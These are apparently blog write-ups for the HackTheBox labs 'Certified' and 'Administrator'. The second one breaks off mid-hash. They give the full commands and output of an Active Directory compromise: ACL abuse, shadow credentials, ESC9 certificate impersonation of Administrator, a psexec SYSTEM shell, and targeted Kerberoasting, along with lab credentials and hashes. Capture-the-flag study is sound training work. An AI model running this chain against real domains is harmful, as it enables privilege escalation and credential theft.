3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Feb 23 05:33:18 2025 -- 1 IP address (1 host up) scanned in 388.52 seconds As we can see the LDAP and Kerberos indicates that we are dealing with an Active Directory Server (Domain Controller).\nThe provided credentials judith.mader:judith09 given in the machine information are valid\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo crackmapexec smb 10.10.11.41 -u judith.mader -p judith09 SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 [+] certified.htb\\judith.mader:judith09 The above results also shows us that the Domain name is certified.htb DC\u0026rsquo;s DNS name is DC01.certified.htb, which we will use to populate the /etc/hosts file.\nI used rpcclient to gather a list of users using enumdomusers command that might be useful in further attacks.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ rpcclient -U \u0026#34;judith.mader%judith09\u0026#34; 10.10.11.41 rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[judith.mader] rid:[0x44f] user:[management_svc] rid:[0x451] user:[ca_operator] rid:[0x452] user:[alexander.huges] rid:[0x641] user:[harry.wilson] rid:[0x642] user:[gregory.cameron] rid:[0x643] I tried to enumerate SMB shares found using CME bellow, but spoiler i couldn\u0026rsquo;t find anything useful in them.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(ayoub㉿MyKali)-[~] └─$ sudo crackmapexec smb 10.10.11.41 -d certtified.htb -u judith.mader -p judith09 --shares SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certtified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 [+] certtified.htb\\judith.mader:judith09 SMB 10.10.11.41 445 DC01 [+] Enumerated shares SMB 10.10.11.41 445 DC01 Share Permissions Remark SMB 10.10.11.41 445 DC01 ----- ----------- ------ SMB 10.10.11.41 445 DC01 ADMIN$ Remote Admin SMB 10.10.11.41 445 DC01 C$ Default share SMB 10.10.11.41 445 DC01 IPC$ READ Remote IPC SMB 10.10.11.41 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.41 445 DC01 SYSVOL READ Logon server share After a bunch of enumeration attempts, i resorted to Bloodhound using the provided credentials to try visualize and see if there are some attack paths that we could take advantage of.\n1 bloodhound-python -d certified.htb -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; -dc \u0026#39;dc01.certified.htb\u0026#39; -c all -ns 10.10.11.41 I searched the user judith.mader and i used the Transitive Objective Control build-in query under OUTBOUND OBJECT CONTROL , which gave me this attack path.\nSo we will proceed as follow : Abuse WriteOwnerACL to add judith.mader to the Management Group \u0026gt; Abuse the GenericWrite ACL using Shadow Credentials on the management_svc service account.\nFirst, we will make judith.mader the owner of the Management Group using impacket-owneredit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo impacket-owneredit -action write -new-owner judith.mader -target MANAGEMENT certified.htb/judith.mader:judith09 /usr/share/doc/python3-impacket/examples/owneredit.py:87: SyntaxWarning: invalid escape sequence \u0026#39;\\V\u0026#39; \u0026#39;S-1-5-83-0\u0026#39;: \u0026#39;NT VIRTUAL MACHINE\\Virtual Machines\u0026#39;, /usr/share/doc/python3-impacket/examples/owneredit.py:96: SyntaxWarning: invalid escape sequence \u0026#39;\\P\u0026#39; \u0026#39;S-1-5-32-554\u0026#39;: \u0026#39;BUILTIN\\Pre-Windows 2000 Compatible Access\u0026#39;, \u0026lt;SNIP\u0026gt; [*] Current owner information below [*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103 [*] - sAMAccountName: judith.mader [*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb [*] OwnerSid modified successfully! Then i made judith.mader have write rights on the management group object using impacket-dacledit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo impacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal \u0026#39;judith.mader\u0026#39; -target-dn \u0026#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB\u0026#39; certified.htb/judith.mader:judith09 /usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence \u0026#39;\\V\u0026#39; \u0026#39;S-1-5-83-0\u0026#39;: \u0026#39;NT VIRTUAL MACHINE\\Virtual Machines\u0026#39;, /usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence \u0026#39;\\P\u0026#39; \u0026#39;S-1-5-32-554\u0026#39;: \u0026#39;BUILTIN\\Pre-Windows 2000 Compatible Access\u0026#39;, \u0026lt;SNIP\u0026gt; /usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence \u0026#39;\\R\u0026#39; \u0026#39;S-1-5-32-580\u0026#39;: \u0026#39;BUILTIN\\Remote Management Users\u0026#39;, Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up to dacledit-20250316-063639.bak [*] DACL modified successfully! Added judith.mader to the Management Group using net to have GenericWrite on the management_svc service account. 1 2 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo net rpc group addmem \u0026#34;management\u0026#34; \u0026#34;judith.mader\u0026#34; -U \u0026#34;CERTIFIED.HTB\u0026#34;/\u0026#34;judith.mader\u0026#34;%\u0026#34;judith09\u0026#34; -S \u0026#34;certified.htb\u0026#34; Let\u0026rsquo;s now verify, and as it seems we successfully added judith.mader to the Management Group.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo net rpc group members \u0026#34;management\u0026#34; -U \u0026#34;certified.htb\u0026#34;/\u0026#34;judith.mader\u0026#34;%\u0026#34;judith09\u0026#34; -S \u0026#34;certified.htb\u0026#34; CERTIFIED\\judith.mader CERTIFIED\\management_svc Since we have now GenericWrite on the management_svc, it means we can write to management_svc attributes, and in this case we will add Shadow Credentials using pywhisker\n1 2 3 4 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo ntpdate 10.10.11.41 2025-03-16 14:06:42.045696 (+0100) +25201.170780 +/- 0.112729 10.10.11.41 s1 no-leap CLOCK: time stepped by 25201.170780 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Certified] └─$ sudo python3 /opt/pywhisker/pywhisker/pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add [*] Searching for the target account [*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb [*] Generating certificate [*] Certificate generated [*] Generating KeyCredential [*] KeyCredential generated with DeviceID: e1b61581-2594-8f88-7648-fc95f608a217 [*] Updating the msDS-KeyCredentialLink attribute of management_svc [+] Updated the msDS-KeyCredentialLink attribute of the target object [+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: Isqd14EX.pfx [*] Must be used with password: 4PFfbzix0hFHbvg6bdVk [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools 1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx cj0VvoOI.pfx -pfx-pass \u0026#39;kcOHYv0aB6Y4fP4wLW9N\u0026#39; certified.htb/management_svc target.ccache 2025-03-16 14:53:03,659 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2025-03-16 14:53:03,687 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2025-03-16 14:53:28,432 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2025-03-16 14:53:28,434 minikerberos INFO 31b6807ee1f84d89eb97b499d7d04fc9ee5d5ce18102b064f3816b994cdb3206 INFO:minikerberos:31b6807ee1f84d89eb97b499d7d04fc9ee5d5ce18102b064f3816b994cdb3206 2025-03-16 14:53:28,447 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file 1 2 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ export KRB5CCNAME=target.ccache 1 2 3 4 5 6 7 8 9 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ python3 /opt/PKINITtools/getnthash.py -key 31b6807ee1f84d89eb97b499d7d04fc9ee5d5ce18102b064f3816b994cdb3206 certified.htb/management_svc Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash a091c1832bcdd4677c28b5a6a1295584 The First Degree Object Conctrol under the Node Info of management_svc showed us that we have GenericAll on the ca_operator object.\nHaving GenericAll on that object means we have complete control over it, so we can change this account\u0026rsquo;s password and take control of it (even not recommended in a real life engagement).\nFor that we will use BloodyAD to do that!\n1 2 3 4 ┌──(ayoub㉿MyKali)-[~] └─$ bloodyAD -d certified.htb -u management_svc -p :a091c1832bcdd4677c28b5a6a1295584 --host 10.10.11.41 set password ca_operator \u0026#39;S3cur3P@ssw0rd!\u0026#39; [+] Password changed successfully! And i\u0026rsquo;ve done it right\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[~] └─$ sudo crackmapexec smb 10.10.11.41 -d certtified.htb -u ca_operator -p S3cur3P@ssw0rd! SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certtified.htb) (signing:True) (SMBv1:False) SMB 10.10.11.41 445 DC01 [+] certtified.htb\\ca_operator:S3cur3P@ssw0rd! Now i used Bloodhound and tried to see if there are any interesting edges for this user but unfortunately without any results.\nAs the name of the account, i thought maybe this is a Certificate Authority, and netexec is always handy to me when it comes to identifying ADCS.\n1 2 3 4 5 6 7 8 ┌──(ayoub㉿MyKali)-[~] └─$ sudo netexec ldap 10.10.11.41 -d certtified.htb -u ca_operator -p S3cur3P@ssw0rd! -M adcs SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False) LDAP 10.10.11.41 389 DC01 [+] certtified.htb\\ca_operator:S3cur3P@ssw0rd! ADCS 10.10.11.41 389 DC01 [*] Starting LDAP search with search filter \u0026#39;(objectClass=pKIEnrollmentService)\u0026#39; ADCS 10.10.11.41 389 DC01 Found PKI Enrollment Server: DC01.certified.htb ADCS 10.10.11.41 389 DC01 Found CN: certified-DC01-CA Now i will use certipy-ad to gather information about Certificate Authority.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ certipy-ad find -u ca_operator -p S3cur3P@ssw0rd! -dc-ip 10.10.11.41 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;certified-DC01-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;certified-DC01-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20250316160850_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20250316160850_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20250316160850_Certipy.json\u0026#39; As we can see from the results provided by certipy-ad we can see there is an ESC9 Vulnerability which will allow us to enroll certain Certificate Template, it means we can request certificates that allow us to impersonate other users. Including Domain Admins.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ┌──(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ cat 20250316160850_Certipy.txt Certificate Authorities 0 CA Name : certified-DC01-CA DNS Name : DC01.certified.htb Certificate Subject : CN=certified-DC01-CA, DC=certified, DC=htb Certificate Serial Number : 36472F2C180FBB9B4983AD4D60CD5A9D Certificate Validity Start : 2024-05-13 15:33:41+00:00 Certificate Validity End : 2124-05-13 15:43:41+00:00 Web Enrollment : Disabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : CERTIFIED.HTB\\Administrators Access Rights ManageCertificates : CERTIFIED.HTB\\Administrators CERTIFIED.HTB\\Domain Admins CERTIFIED.HTB\\Enterprise Admins ManageCa : CERTIFIED.HTB\\Administrators CERTIFIED.HTB\\Domain Admins CERTIFIED.HTB\\Enterprise Admins Enroll : CERTIFIED.HTB\\Authenticated Users Certificate Templates 0 Template Name : CertifiedAuthentication Display Name : Certified Authentication Certificate Authorities : certified-DC01-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : False Certificate Name Flag : SubjectRequireDirectoryPath SubjectAltRequireUpn Enrollment Flag : NoSecurityExtension AutoEnrollment PublishToDs Private Key Flag : 16842752 Extended Key Usage : Server Authentication Client Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 1000 years Renewal Period : 6 weeks Minimum RSA Key Length : 2048 Permissions Enrollment Permissions Enrollment Rights : CERTIFIED.HTB\\operator ca CERTIFIED.HTB\\Domain Admins CERTIFIED.HTB\\Enterprise Admins Object Control Permissions Owner : CERTIFIED.HTB\\Administrator Write Owner Principals : CERTIFIED.HTB\\Domain Admins CERTIFIED.HTB\\Enterprise Admins CERTIFIED.HTB\\Administrator Write Dacl Principals : CERTIFIED.HTB\\Domain Admins CERTIFIED.HTB\\Enterprise Admins CERTIFIED.HTB\\Administrator Write Property Principals : CERTIFIED.HTB\\Domain Admins CERTIFIED.HTB\\Enterprise Admins CERTIFIED.HTB\\Administrator [!] Vulnerabilities ESC9 : \u0026#39;CERTIFIED.HTB\\\\operator ca\u0026#39; can enroll and template has no security extension This Blog guided me through that, and as it said the Requisites is GenericWrite over any account A to compromise any account B.\nTo perform this attack we will need the password hash of the ca_operator which is below (I used this Website to hash the password S3cur3P@ssw0rd!)\n1 D5915E565671E06FD6D67A460D59583E Next, we change the userPrincipalName of ca_operator to be Administrator.\n1 2 3 4 5 6 7 ┌──(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ sudo certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_operator\u0026#39;: userPrincipalName : administrator [*] Successfully updated \u0026#39;ca_operator\u0026#39; Now, we request the vulnerable certificate template CertifiedAuthentication. We must request the certificate as ca_operator.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ sudo certipy-ad req -username ca_operator@certified.htb -hashes D5915E565671E06FD6D67A460D59583E -ca certified-DC01-CA -template CertifiedAuthentication -debug Certipy v4.8.2 - by Oliver Lyak (ly4k) [+] Trying to resolve \u0026#39;CERTIFIED.HTB\u0026#39; at \u0026#39;192.168.1.254\u0026#39; [+] Resolved \u0026#39;CERTIFIED.HTB\u0026#39; from cache: 10.10.11.41 [+] Generating RSA key [*] Requesting certificate via RPC [+] Trying to connect to endpoint: ncacn_np:10.10.11.41[\\pipe\\cert] [+] Connected to endpoint: ncacn_np:10.10.11.41[\\pipe\\cert] [*] Successfully requested certificate [*] Request ID is 5 [*] Got certificate with UPN \u0026#39;administrator\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; That gave us a administrator.pfx certificate, which can be used to authenticate to the Domain Controller as Administrator.\nWe must then change the ca_operator back to its original UPN.\n1 2 3 4 5 6 7 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Updating user \u0026#39;ca_operator\u0026#39;: userPrincipalName : ca_operator@certified.htb [*] Successfully updated \u0026#39;ca_operator\u0026#39; Let\u0026rsquo;s now get the Administrator\u0026rsquo;s TGT and his NTLM hash\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ sudo ntpdate 10.10.11.41 2025-03-17 03:05:40.599937 (+0100) +35785.588485 +/- 0.074389 10.10.11.41 s1 no-leap CLOCK: time stepped by 35785.588485 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ certipy-ad auth -pfx administrator.pfx -domain certified.htb Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@certified.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@certified.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 Finally, I used psexec.py to get a shell as the Administrtaor user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ┌──(.venv)─(ayoub㉿MyKali)-[~/…/HTB/Certified/CA/C!] └─$ psexec.py \u0026#39;certified.htb/Administrator@10.10.11.41\u0026#39; -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 10.10.11.41..... [*] Found writable share ADMIN$ [*] Uploading file fVKmJzkE.exe [*] Opening SVCManager on 10.10.11.41..... [*] Creating service bRER on 10.10.11.41..... [*] Starting service bRER..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.6414] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system C:\\Windows\\system32\u0026gt; cd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop\u0026gt; dir Volume in drive C has no label. Volume Serial Number is EA74-A0A7 Directory of C:\\Users\\Administrator\\Desktop 10/22/2024 01:15 PM \u0026lt;DIR\u0026gt; . 10/22/2024 01:15 PM \u0026lt;DIR\u0026gt; .. 03/16/2025 07:42 PM 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 5,238,980,608 bytes free C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt fbb7b2015f20279c3bccc2794b2c5ec0 ","date":"2025-02-25T00:00:00Z","image":"https://r4z1o.github.io/p/certified-htb-writeup/Certified_hu_65f32ba54a462427.png","permalink":"https://r4z1o.github.io/p/certified-htb-writeup/","title":"Certified HTB Writeup"},{"content":"Nmap Scan : We will start our journey by running an nmap scan on the provided ip address, and the result below show that ports like 88 for Kerberos and 389 for LDAP, which indicates that we are dealing with Domain Controller Active Directory Server.\nThe results also shows that the domain we are up against is : administrator.htb\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ sudo nmap -sV -sC -O -Pn --disable-arp-ping -o scan-nmap 10.10.11.42 Nmap scan report for 10.10.11.42 Host is up (0.068s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-22 02:38:36Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=2/21%OT=21%CT=1%CU=36753%PV=Y%DS=2%DC=I%G=Y%TM=67B8 OS:D65A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%CI=I%II=I%TS=A)SEQ(S OS:P=102%GCD=1%ISR=105%CI=I%TS=A)SEQ(SP=102%GCD=1%ISR=105%CI=I%II=I%TS=A)OP OS:S(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW OS:8ST11%O6=M53CST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)EC OS:N(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O% OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-02-22T02:38:59 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 7h00m00s Since the description of the box provided us with credentials Olivia:ichliebedich , assuming we have a foothold on the domain, we will use them to enumerate things like SMB shares and users which i dogged through each of them but nothing comes handy.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ rpcclient -U \u0026#34;Olivia%ichliebedich\u0026#34; 10.10.11.42 rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[olivia] rid:[0x454] user:[michael] rid:[0x455] user:[benjamin] rid:[0x456] user:[emily] rid:[0x458] user:[ethan] rid:[0x459] user:[alexander] rid:[0xe11] user:[emma] rid:[0xe12] rpcclient $\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ sudo netexec smb 10.10.11.42 -u olivia -p ichliebedich --shares [sudo] password for ayoub: SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\olivia:ichliebedich SMB 10.10.11.42 445 DC [*] Enumerated shares SMB 10.10.11.42 445 DC Share Permissions Remark SMB 10.10.11.42 445 DC ----- ----------- ------ SMB 10.10.11.42 445 DC ADMIN$ Remote Admin SMB 10.10.11.42 445 DC C$ Default share SMB 10.10.11.42 445 DC IPC$ READ Remote IPC SMB 10.10.11.42 445 DC NETLOGON READ Logon server share SMB 10.10.11.42 445 DC SYSVOL READ Logon server share I tried to access the FTP server, maybe there is something interesting there, but unfortunately we can\u0026rsquo;t login.\n1 2 3 4 5 6 7 8 9 10 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ ftp 10.10.11.42 Connected to 10.10.11.42. 220 Microsoft FTP Service Name (10.10.11.42:ayoub): olivia 331 Password required Password: 530 User cannot log in, home directory inaccessible. ftp: Login failed ftp\u0026gt; I gathered data using bloodhound-python for a better visibility, and see if there are some interesting Edges that we could take advantages of.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ┌──(ayoub㉿MyKali)-[~/Documents/HTB/Administrator] └─$ bloodhound-python -d administrator.htb -u Olivia -p \u0026#39;ichliebedich\u0026#39; -ns 10.10.11.42 -c all INFO: Found AD domain: administrator.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known INFO: Connecting to LDAP server: dc.administrator.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: dc.administrator.htb INFO: Found 11 users INFO: Found 53 groups INFO: Found 2 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: dc.administrator.htb INFO: Done in 00M 14S Using the Transitive Object Control built-in query under OUTBOUND OBJECT CONTROL, we can see that the user under our control Olivia have GenericAll ACL right on Michael user, and Michael have ForceChangePassword on Benjamin user.\nLet\u0026rsquo;s first synchronize the time with server because Kerberos authentication is very strict about time calibration. and then take over the Michael user by performing a targeted Kerberoasting.\n1 2 3 4 5 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ sudo ntpdate 10.10.11.42 2025-03-29 00:14:36.325066 (+0100) +179778.282233 +/- 0.124255 10.10.11.42 s1 no-leap CLOCK: time stepped by 179778.282233 CLOCK: time changed from 2025-03-26 to 2025-03-29 I tried to crack this hash using hashcat but it looks like it\u0026rsquo;s not crackable.\n1 2 3 4 5 6 7 8 9 ┌──(ayoub㉿MyKali)-[/opt/targetedKerberoast] └─$ sudo ./targetedKerberoast.py -v -d \u0026#39;administrator.htb\u0026#39; -u \u0026#39;Olivia\u0026#39; -p \u0026#39;ichliebedich\u0026#39; [sudo] password for ayoub: [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [VERBOSE] SPN added successfully for (michael) [+] Printing hash for (michael) $krb5tgs$23$*michael$ADMINISTRATOR.HTB$administrator.htb/michael*$dab2d314b3a8bcacc9ddc48fcd143bfd$328623529607e8f69d1d61bd484ae60354cad35d2bc2a81062cb5960cb4fff619cdd9b16257d3d3b01fe8c41f99df969c9ed29e804d800f02d5ba5d01d89dbf517e0fb7ed279d91863f14727f859f90706e7d8cc180ad8da9f5ee78ada48abbca066f5771f997e2f29294ab770ed1b9ad70607996c4e5dbeaf8ff5bf6363b59a50ed6861b47ce01547814d1ac2a76c4d04594dd91d7a93fa96ca76aa3288c7a62ec6611f820f103b755cbd4e11dca3120ca259aa221e40d084a1af5167d02d6b0f3f445bda2fc8475ec87b8c702d54c385f293495f3daa42b4d6c9cd9c34f743ca071ab8eeeaeced1644db5abac4c892c6bc78dab76192b61514bc87b5e75cff952fbd156afc2575cdfc5286902912fa5e3d5fd9793db08d2106a6ce80fd757a3a7afcde927a265617181158864aaf9312ae0d67cd504a0f1c4c4f1f246faf4764d201950d3e9644fb6c7f7d5e3f94b4ac48897cc002cfe79b6b983b8f9deb00d1699086d327bde6e62e8072bcacb46b8b3585ba993943e785a77f5d7e4d5fa0d6814aea06df72c2ca7513c03b7def9ae1f34d7e85a3852b9a2f313b281ec3b7e321161762bc65fe984bfeaa1afbab58ed2f0eae88e9758ea8d6264c3b552edad6b453a1cd5c2b8e5322e4b40ea8f074b99a8a4569b7e5d551f9f6eb4889b2745486aae238386e0002d9a807c9d240d7bf1a47f8803cf17921c920b3de1c45ae2efbd10b606e698f1f5cadcff7334227fca9b460c555ac843a65ba820a912bcfcf00a4d5c971b7781296ef9953089a744481546cfd1910080ca3912980a50333fbc35d16b7849fa91fa510b5bfd37c5326c4517a386407ab0c16910a1ae20c8d0c5c448d3dfcb2208e70a5f2d13f4b5eeacb13c686bfbf6b600ad9ba0426857f8a7fbb139abdd08ef6484359c3618b3da18e691c54d24ffd2aebdc39e61a910fe9bad37e447b5786fece50938d09ad5f04ff54144a26eb4387ef2caae5f4ee98fadaac51f477df9132a44da4311abe9e2ea0794b669ae510da5e29ab96dcd7b5643fbb1a050a250084bea52d13eb0a25ea843912442bce2c232f50b213c86ec8722bd5822554262dbf68f9a5abf0765d077dd54a50ab906de055f8b65cddfd3864468d8ceb7c8a02665a84fdf669869c5b656a0a8985b0b135067b4d98e7b747d1353182be7b9f641292ef56579cc6884460819e7cf9abea0fead04264d4a0c606092f479fe660b13a6d1cc1eb2dc51b200a5997ec4187e99ab224c8b8e1a7ccd0aa99ddd6f0e92c3fdcd933e3b7a4cc2ac67c565d00cd44339ffc075addd62e6ba819b75a615e259fbb77ce4823cd1da3512c883cdbda170a0c835a0d43648f2c990d0a550c2b34f4bfa66428b5ec1284dce2814b050ea13d30f15e77b96eb529ed970a02f18c41226c6e26b0b23fc2bd2d7ea6a9b04f23d93db758c40ef540c9e0082c638b9fedbf0810746862c3a4a89718ab36d19f6ae1c134a84e6e779a